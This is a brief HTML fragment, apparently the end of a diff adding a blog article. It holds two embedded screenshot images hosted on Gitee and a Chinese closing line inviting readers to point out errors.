+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328153708049.png" alt="image-20210328153708049"></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328183720027.png" alt="image-20210328183720027"></p>
+<p> 文章中有什么不足和错误的地方还望师傅们指正。</p>
 
       
     </div>
